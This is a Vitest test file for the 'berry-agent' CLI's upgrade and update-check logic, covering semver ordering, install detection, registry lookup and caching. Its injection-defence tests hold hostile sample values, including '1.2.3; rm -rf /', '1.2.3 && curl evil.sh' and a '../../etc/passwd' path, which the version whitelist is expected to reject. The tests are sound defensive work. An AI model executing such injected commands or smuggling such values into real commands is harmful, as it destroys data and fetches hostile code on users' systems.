/**
 * host/upgrade 测试——07 §8.5 第 1 条（upgrade 三态）+ 第 6 条（启动版本
 * 检查）回归锁。全注入面（spawn/fetch/fs/now/runInstall 零真网络零真装）。
 */
import { describe, expect, it } from 'vitest';

import {
  compareSemverFull,
  detectInstallForm,
  fetchDistTags,
  readUpdateCheckState,
  recordNotifiedVersion,
  runManualUpdateCheck,
  runStartupUpdateCheck,
  runUpgradeCommand,
  resolveRegistryRoot,
  TARGET_RE,
  writeUpdateCheckState,
  type UpdateCheckFs,
} from './upgrade.js';
import type { SpawnRunner } from './plugin-install.js';
import type { FetchLike } from '../web/types.js';

// —— 测试基件 ——————————————————————————————————————————————

/** 内存 fs（update-check.json 单文件形——路径键原文存取） */
function memoryFs(initial: Record<string, string> = {}): UpdateCheckFs & { files: Map<string, string> } {
  const files = new Map<string, string>(Object.entries(initial));
  return {
    files,
    readIfExists: (path) => files.get(path) ?? null,
    write: (path, text) => {
      files.set(path, text);
    },
  };
}

/** 假 fetch（按 URL 应答——json 形快捷 + 原始 Response 形） */
function fakeFetch(
  handler: (url: string) => { status: number; body?: string; headers?: Record<string, string> } | Error,
): FetchLike & { calls: string[] } {
  const calls: string[] = [];
  return Object.assign(
    (async (url: string) => {
      calls.push(String(url));
      const plan = handler(String(url));
      if (plan instanceof Error) throw plan;
      return new Response(plan.body ?? '', { status: plan.status, headers: plan.headers });
    }) as FetchLike,
    { calls },
  );
}

/** 假 spawn（npm config get registry 应答可注；调用记录可断言） */
function fakeSpawn(registryOutput: string | Error): SpawnRunner & { calls: string[] } {
  const calls: string[] = [];
  return Object.assign(
    {
      run: async (cmd: string, args: readonly string[]) => {
        calls.push(`${cmd} ${args.join(' ')}`);
        if (registryOutput instanceof Error) throw registryOutput;
        return { stdout: registryOutput, stderr: '' };
      },
    } satisfies SpawnRunner,
    { calls },
  );
}

/** dist-tags JSON 应答体 */
const tagsBody = (latest: string) => JSON.stringify({ latest, next: latest });

// —— compareSemverFull：semver 含 prerelease 全序 ————————————————

describe('compareSemverFull（§8.5 第 6 条判序——prerelease 全序）', () => {
  it('三段数值序', () => {
    expect(compareSemverFull('0.1.0', '0.0.9')).toBe(1);
    expect(compareSemverFull('1.2.3', '1.2.4')).toBe(-1);
    expect(compareSemverFull('2.0.0', '2.0.0')).toBe(0);
  });

  it('alpha 期 prerelease 数值标识符数值比（alpha.9 < alpha.10）', () => {
    expect(compareSemverFull('0.1.0-alpha.10', '0.1.0-alpha.9')).toBe(1);
    expect(compareSemverFull('0.1.0-alpha.4', '0.1.0-alpha.4')).toBe(0);
  });

  it('无 prerelease 大于有（1.0.0 > 1.0.0-alpha.1）', () => {
    expect(compareSemverFull('1.0.0', '1.0.0-alpha.1')).toBe(1);
    expect(compareSemverFull('1.0.0-rc.1', '1.0.0')).toBe(-1);
  });

  it('数值标识符恒小于字母数字标识符（alpha.1 < alpha.beta）', () => {
    expect(compareSemverFull('1.0.0-1', '1.0.0-beta')).toBe(-1);
  });

  it('前缀全等时字段多者大（alpha < alpha.1）', () => {
    expect(compareSemverFull('1.0.0-alpha', '1.0.0-alpha.1')).toBe(-1);
  });

  it('build metadata 段忽略 + v 前缀容忍', () => {
    expect(compareSemverFull('1.0.0+build.5', '1.0.0')).toBe(0);
    expect(compareSemverFull('v1.0.0', '1.0.0')).toBe(0);
  });

  it('非 semver 形返 null（判序无从起——保守处置锚）', () => {
    expect(compareSemverFull('not-a-version', '1.0.0')).toBeNull();
    expect(compareSemverFull('1.0', '1.0.0')).toBeNull();
  });
});

// —— detectInstallForm：装机形态甄别 ————————————————————————

describe('detectInstallForm（§8.5 第 1 条三态 + 管理器甄别）', () => {
  it('npm 全局形（node_modules 段）', () => {
    expect(detectInstallForm('/usr/local/lib/node_modules/berry-agent/dist/host/main.js')).toBe('npm-global');
    expect(
      detectInstallForm('/Users/x/.nvm/versions/node/v24.1.0/lib/node_modules/berry-agent/dist/host/main.js'),
    ).toBe('npm-global');
  });

  it('pnpm 形先于通形判（.pnpm 段——路径同样含 node_modules）', () => {
    expect(
      detectInstallForm(
        '/Users/x/Library/pnpm/global/5/.pnpm/berry-agent@1.0.0/node_modules/berry-agent/dist/host/main.js',
      ),
    ).toBe('pnpm');
  });

  it('bun 形（.bun 段）与 yarn 形（.yarn 段 / yarn+global 相邻段）', () => {
    expect(detectInstallForm('/Users/x/.bun/install/global/node_modules/berry-agent/dist/host/main.js')).toBe('bun');
    expect(detectInstallForm('/Users/x/.yarn/global/node_modules/berry-agent/dist/host/main.js')).toBe('yarn');
    expect(detectInstallForm('/Users/x/.config/yarn/global/node_modules/berry-agent/dist/host/main.js')).toBe('yarn');
  });

  it('win32 反斜杠同判 + 源码形态（无 node_modules）', () => {
    expect(
      detectInstallForm('C:\\Users\\x\\AppData\\Roaming\\npm\\node_modules\\berry-agent\\dist\\host\\main.js'),
    ).toBe('npm-global');
    expect(detectInstallForm('/Users/x/Documents/code/berry-agent/dist/host/main.js')).toBe('source');
  });
});

// —— resolveRegistryRoot：两腿同源律 ——————————————————————————

describe('resolveRegistryRoot（两腿同源律——用户 registry 解析）', () => {
  it('npm config get registry 输出裁白 + 尾斜杠剥除', async () => {
    const spawn = fakeSpawn('https://registry.example.com/\n');
    const result = await resolveRegistryRoot(spawn);
    expect(result).toEqual({ root: 'https://registry.example.com', fallback: false });
    expect(spawn.calls).toEqual(['npm config get registry']);
  });

  it('输出越形（非 http[s]）回退官方源并置 fallback', async () => {
    const result = await resolveRegistryRoot(fakeSpawn('not-a-url'));
    expect(result).toEqual({ root: 'https://registry.npmjs.org', fallback: true });
  });

  it('npm 缺席（spawn 拒）回退官方源', async () => {
    const result = await resolveRegistryRoot(fakeSpawn(new Error('npm not found')));
    expect(result).toEqual({ root: 'https://registry.npmjs.org', fallback: true });
  });
});

// —— fetchDistTags：只读 GET + 帽 + 形校验 ————————————————————

describe('fetchDistTags（只读 GET——零外传 + 帽两件）', () => {
  it('200 → latest 键读出；URL 恰为 dist-tags 端点（GET 无请求体）', async () => {
    const fetch = fakeFetch(() => ({ status: 200, body: tagsBody('0.1.0-alpha.5') }));
    const result = await fetchDistTags('https://registry.example.com', { fetchImpl: fetch });
    expect(result).toEqual({ kind: 'ok', latest: '0.1.0-alpha.5' });
    expect(fetch.calls).toEqual(['https://registry.example.com/berry-agent/dist-tags']);
  });

  it('404 单列（未发布态判据位）', async () => {
    const result = await fetchDistTags('https://r.example.com', { fetchImpl: fakeFetch(() => ({ status: 404 })) });
    expect(result).toEqual({ kind: 'not-found' });
  });

  it('非 2xx 非 404 → failed 带状态', async () => {
    const result = await fetchDistTags('https://r.example.com', { fetchImpl: fakeFetch(() => ({ status: 503 })) });
    expect(result).toEqual({ kind: 'failed', message: 'registry 应答 503' });
  });

  it('latest 键缺席/非串 → failed（registry 响应不可信）', async () => {
    const bad = fakeFetch(() => ({ status: 200, body: JSON.stringify({ next: '1.0.0' }) }));
    expect(await fetchDistTags('https://r.example.com', { fetchImpl: bad })).toMatchObject({ kind: 'failed' });
    const badType = fakeFetch(() => ({ status: 200, body: JSON.stringify({ latest: 42 }) }));
    expect(await fetchDistTags('https://r.example.com', { fetchImpl: badType })).toMatchObject({ kind: 'failed' });
  });

  it('content-length 头越 64KiB 帽即拒（不下载）', async () => {
    const oversized = fakeFetch(() => ({
      status: 200,
      body: tagsBody('1.0.0'),
      headers: { 'content-length': String(1024 * 1024) },
    }));
    const result = await fetchDistTags('https://r.example.com', { fetchImpl: oversized });
    expect(result).toMatchObject({ kind: 'failed' });
    expect(result.kind === 'failed' && result.message).toContain('越体帽');
  });

  it('网络错/超时 → failed 静默形（不 throw）', async () => {
    const dead = fakeFetch(() => new Error('fetch failed'));
    expect(await fetchDistTags('https://r.example.com', { fetchImpl: dead })).toMatchObject({ kind: 'failed' });
  });
});

// —— TARGET_RE：spawn 插值白名单（契约级） ————————————————————

describe('TARGET_RE（spawn 插值白名单——命令注入面防御）', () => {
  it('合法 semver 形收（含 prerelease）', () => {
    expect(TARGET_RE.test('1.2.3')).toBe(true);
    expect(TARGET_RE.test('0.1.0-alpha.4')).toBe(true);
  });

  it('越形全拒：v 前缀/shell 元字符/多行/路径形/空串', () => {
    expect(TARGET_RE.test('v1.2.3')).toBe(false);
    expect(TARGET_RE.test('1.2.3; rm -rf /')).toBe(false);
    expect(TARGET_RE.test('1.2.3 && curl evil.sh')).toBe(false);
    expect(TARGET_RE.test('1.2.3\n第二个声明')).toBe(false);
    expect(TARGET_RE.test('../../etc/passwd')).toBe(false);
    expect(TARGET_RE.test('')).toBe(false);
  });
});

// —— 缓存三键 IO ——————————————————————————————————————————————

describe('update-check.json 三键（读坏形容忍 + 只前进合并）', () => {
  it('读写往返 + 坏 JSON/键形越界读为 null', () => {
    const fs = memoryFs();
    writeUpdateCheckState(fs, '/data', { lastCheckedAt: 100, latest: '0.1.0', notifiedVersion: null });
    expect(readUpdateCheckState(fs, '/data')).toEqual({ lastCheckedAt: 100, latest: '0.1.0', notifiedVersion: null });
    const bad = memoryFs({ '/data/update-check.json': '{oops' });
    expect(readUpdateCheckState(bad, '/data')).toBeNull();
    const wrongShape = memoryFs({
      '/data/update-check.json': JSON.stringify({ lastCheckedAt: 'x', latest: 1 }),
    });
    expect(readUpdateCheckState(wrongShape, '/data')).toBeNull();
    expect(readUpdateCheckState(memoryFs(), '/data')).toBeNull(); // 缺席
  });

  it('recordNotifiedVersion 合并保留其余两键', () => {
    const fs = memoryFs();
    writeUpdateCheckState(fs, '/data', { lastCheckedAt: 500, latest: '0.2.0', notifiedVersion: null });
    recordNotifiedVersion(fs, '/data', '0.2.0', 600);
    expect(readUpdateCheckState(fs, '/data')).toEqual({
      lastCheckedAt: 500,
      latest: '0.2.0',
      notifiedVersion: '0.2.0',
    });
  });
});

// —— runManualUpdateCheck：强制刷新 + 只前进 ————————————————————

describe('runManualUpdateCheck（手动通道——恒走网络 + 写回缓存）', () => {
  const baseDeps = (fs: UpdateCheckFs, fetchImpl: FetchLike) => ({
    dataDir: '/data',
    currentVersion: '0.1.0-alpha.4',
    spawn: fakeSpawn('https://registry.example.com'),
    fetchImpl,
    fs,
    now: () => 1000,
  });

  it('成功写回三键（notifiedVersion 保留缓存值——手动查看不动去重位）', async () => {
    const fs = memoryFs();
    writeUpdateCheckState(fs, '/data', { lastCheckedAt: 1, latest: '0.1.0-alpha.3', notifiedVersion: '0.1.0-alpha.3' });
    const fetch = fakeFetch(() => ({ status: 200, body: tagsBody('0.1.0-alpha.5') }));
    const result = await runManualUpdateCheck(baseDeps(fs, fetch));
    expect(result).toEqual({ kind: 'ok', latest: '0.1.0-alpha.5', registryFallback: false });
    expect(readUpdateCheckState(fs, '/data')).toEqual({
      lastCheckedAt: 1000,
      latest: '0.1.0-alpha.5',
      notifiedVersion: '0.1.0-alpha.3',
    });
  });

  it('只前进律：新查值比缓存低即弃（旧窗慢回执形）', async () => {
    const fs = memoryFs();
    writeUpdateCheckState(fs, '/data', { lastCheckedAt: 1, latest: '0.1.0-alpha.5', notifiedVersion: '0.1.0-alpha.5' });
    const stale = fakeFetch(() => ({ status: 200, body: tagsBody('0.1.0-alpha.4') }));
    const result = await runManualUpdateCheck(baseDeps(fs, stale));
    expect(result.kind).toBe('ok');
    // latest 不回退（保 0.1.0-alpha.5）——lastCheckedAt 照取新查值
    expect(readUpdateCheckState(fs, '/data')).toEqual({
      lastCheckedAt: 1000,
      latest: '0.1.0-alpha.5',
      notifiedVersion: '0.1.0-alpha.5',
    });
  });

  it('失败不写缓存（网络瞬断不钉 24h 窗）+ 404 单列', async () => {
    const fs = memoryFs();
    const dead = fakeFetch(() => new Error('offline'));
    await runManualUpdateCheck(baseDeps(fs, dead));
    expect(readUpdateCheckState(fs, '/data')).toBeNull();
    const notFound = fakeFetch(() => ({ status: 404 }));
    expect(await runManualUpdateCheck(baseDeps(fs, notFound))).toEqual({ kind: 'not-found' });
  });
});

// —— runStartupUpdateCheck：节流/env 归零/去重 ———————————————————

describe('runStartupUpdateCheck（§8.5 第 6 条——启动腿编排）', () => {
  const deps = (overrides: Partial<Parameters<typeof runStartupUpdateCheck>[0]> = {}) => {
    const fs = memoryFs();
    const fetch = fakeFetch(() => ({ status: 200, body: tagsBody('0.1.0-alpha.5') }));
    return {
      base: {
        dataDir: '/data',
        currentVersion: '0.1.0-alpha.4',
        spawn: fakeSpawn('https://registry.example.com'),
        fetchImpl: fetch,
        fs,
        now: () => 10_000_000, // 距任一初始缓存远超 24h
        env: {} as Record<string, string | undefined>,
        ...overrides,
      },
      fetch,
      fs,
    };
  };

  it('env 置值即 skipped（关掉即零网络——fetch 零调用）', async () => {
    const { base, fetch } = deps({ env: { BERRY_AGENT_SKIP_UPDATE_CHECK: '1' } });
    const decision = await runStartupUpdateCheck(base);
    expect(decision).toEqual({ kind: 'skipped', reason: 'env-off' });
    expect(fetch.calls).toHaveLength(0);
  });

  it('缓存新鲜窗内 cache-fresh 零网络直读缓存', async () => {
    const { base, fetch, fs } = deps({ now: () => 5_000 } as never); // 距缓存 1000 仅 4000ms
    writeUpdateCheckState(fs, '/data', { lastCheckedAt: 1_000, latest: '0.1.0-alpha.5', notifiedVersion: null });
    const decision = await runStartupUpdateCheck(base);
    expect(decision).toEqual({
      kind: 'cache-fresh',
      latest: '0.1.0-alpha.5',
      hasUpdate: true,
      alreadyNotified: false,
    });
    expect(fetch.calls).toHaveLength(0);
  });

  it('窗内已提示过该版 → alreadyNotified true（按版本去重）', async () => {
    const { base, fetch, fs } = deps({ now: () => 5_000 } as never);
    writeUpdateCheckState(fs, '/data', {
      lastCheckedAt: 1_000,
      latest: '0.1.0-alpha.5',
      notifiedVersion: '0.1.0-alpha.5',
    });
    const decision = await runStartupUpdateCheck(base);
    expect(decision).toMatchObject({ kind: 'cache-fresh', hasUpdate: true, alreadyNotified: true });
    expect(fetch.calls).toHaveLength(0);
  });

  it('缓存过期 → 网络查 + 写回 + checked 判序（alpha.5 > alpha.4 数值比）', async () => {
    const { base } = deps();
    const decision = await runStartupUpdateCheck(base);
    expect(decision).toEqual({
      kind: 'checked',
      latest: '0.1.0-alpha.5',
      hasUpdate: true,
      alreadyNotified: false,
    });
  });

  it('latest 非更高版（三段全等 prerelease 同版）→ hasUpdate false', async () => {
    const { base } = deps();
    // fetch 返回与本地同版——判序 0 即无更新
    const same = fakeFetch(() => ({ status: 200, body: tagsBody('0.1.0-alpha.4') }));
    const decision = await runStartupUpdateCheck({ ...base, fetchImpl: same });
    expect(decision).toMatchObject({ kind: 'checked', hasUpdate: false });
  });

  it('网络失败 → failed（调用方零提示语义的锚——回执不含提示文案职责）且不写缓存', async () => {
    const { base, fs } = deps();
    const dead = fakeFetch(() => new Error('dns broke'));
    const decision = await runStartupUpdateCheck({ ...base, fetchImpl: dead });
    expect(decision).toMatchObject({ kind: 'failed' });
    expect(readUpdateCheckState(fs, '/data')).toBeNull();
  });
});

// —— runUpgradeCommand：CLI 三态编舞 ————————————————————————————

describe('runUpgradeCommand（§8.5 第 1 条三态——CLI 维护动词）', () => {
  const cliDeps = (overrides: {
    realEntryPath?: string;
    fetchImpl?: FetchLike;
    runInstall?: (target: string) => Promise<boolean>;
  }) => {
    const out: string[] = [];
    const err: string[] = [];
    const fetch = overrides.fetchImpl ?? fakeFetch(() => ({ status: 200, body: tagsBody('0.1.0-alpha.5') }));
    const installCalls: string[] = [];
    return {
      deps: {
        currentVersion: '0.1.0-alpha.4',
        realEntryPath: overrides.realEntryPath ?? '/usr/local/lib/node_modules/berry-agent/dist/host/main.js',
        spawn: fakeSpawn('https://registry.example.com'),
        fetchImpl: fetch,
        dataDir: '/data',
        fs: memoryFs(),
        now: () => 1000,
        writeOut: (t: string) => out.push(t),
        writeErr: (t: string) => err.push(t),
        runInstall:
          overrides.runInstall ??
          (async (target: string) => {
            installCalls.push(target);
            return true;
          }),
      },
      out,
      err,
      installCalls,
    };
  };

  it('源码形态：指引四步不代执行（零网络零 spawn）', async () => {
    const { deps, out, err } = cliDeps({ realEntryPath: '/src/berry-agent/dist/host/main.js' });
    const code = await runUpgradeCommand(deps);
    expect(code).toBe(0);
    expect(out.join('\n')).toContain('git pull');
    expect(out.join('\n')).toContain('npm link');
    expect(err).toHaveLength(0);
  });

  it.each([
    ['pnpm', '/x/.pnpm/berry-agent@1/node_modules/berry-agent/dist/host/main.js', 'pnpm add -g berry-agent'],
    ['yarn', '/x/.yarn/global/node_modules/berry-agent/dist/host/main.js', 'yarn global add berry-agent'],
    ['bun', '/x/.bun/install/global/node_modules/berry-agent/dist/host/main.js', 'bun add -g berry-agent'],
  ])('%s 形：只打原管理器指引不代执行', async (_form, path, guideCmd) => {
    const { deps, out, installCalls } = cliDeps({ realEntryPath: path });
    const code = await runUpgradeCommand(deps);
    expect(code).toBe(0);
    expect(out.join('\n')).toContain(guideCmd);
    expect(out.join('\n')).toContain('第二份');
    expect(installCalls).toHaveLength(0);
  });

  it('npm 形已最新（latest 同版）：退 0 不装机', async () => {
    const { deps, out, installCalls } = cliDeps({
      fetchImpl: fakeFetch(() => ({ status: 200, body: tagsBody('0.1.0-alpha.4') })),
    });
    const code = await runUpgradeCommand(deps);
    expect(code).toBe(0);
    expect(out.join('\n')).toContain('已是最新');
    expect(installCalls).toHaveLength(0);
  });

  it('npm 形有新版：target 过白名单 → 装机 → 重启提示（registryFallback 注记缺席）', async () => {
    const { deps, out, installCalls } = cliDeps({});
    const code = await runUpgradeCommand(deps);
    expect(code).toBe(0);
    expect(installCalls).toEqual(['0.1.0-alpha.5']);
    expect(out.join('\n')).toContain('0.1.0-alpha.5');
    expect(out.join('\n')).toContain('重启');
    expect(out.join('\n')).not.toContain('回退官方源');
  });

  it('registry 解析失败回退官方源注记在案', async () => {
    const { deps, out } = cliDeps({});
    // spawn 报错 → resolveRegistryRoot 回退官方源；fetch 照答
    (deps.spawn as unknown as { calls: string[] }).calls.length = 0;
    const broken = fakeSpawn(new Error('no npm'));
    const code = await runUpgradeCommand({ ...deps, spawn: broken });
    expect(code).toBe(0);
    expect(out.join('\n')).toContain('回退官方源');
  });

  it('latest 越形（非白名单 semver）→ 契约级拒——不达 spawn 插值位', async () => {
    const evil = fakeFetch(() => ({ status: 200, body: tagsBody('1.2.3; rm -rf /') }));
    const { deps, err, installCalls } = cliDeps({ fetchImpl: evil });
    const code = await runUpgradeCommand(deps);
    expect(code).toBe(1);
    expect(err.join('\n')).toContain('拒执行装机');
    expect(installCalls).toHaveLength(0);
  });

  it('registry 404 → 未发布态诚实告知 + 源码指引，退 1', async () => {
    const { deps, err } = cliDeps({ fetchImpl: fakeFetch(() => ({ status: 404 })) });
    const code = await runUpgradeCommand(deps);
    expect(code).toBe(1);
    expect(err.join('\n')).toContain('404');
    expect(err.join('\n')).toContain('npm link');
  });

  it('网络失败 → 诚实报错退 1（含手动命令指引）', async () => {
    const { deps, err } = cliDeps({ fetchImpl: fakeFetch(() => new Error('offline')) });
    const code = await runUpgradeCommand(deps);
    expect(code).toBe(1);
    expect(err.join('\n')).toContain('版本检查失败');
    expect(err.join('\n')).toContain('npm i -g berry-agent@latest');
  });

  it('装机失败（npm 非零退出）→ 退 1 带手动指引', async () => {
    const { deps, err } = cliDeps({ runInstall: async () => false });
    const code = await runUpgradeCommand(deps);
    expect(code).toBe(1);
    expect(err.join('\n')).toContain('装机失败');
  });

  it('成功查后写回缓存（主动查强制刷新语义）', async () => {
    const { deps } = cliDeps({});
    await runUpgradeCommand(deps);
    expect(readUpdateCheckState(deps.fs, '/data')).toMatchObject({ latest: '0.1.0-alpha.5' });
  });
});
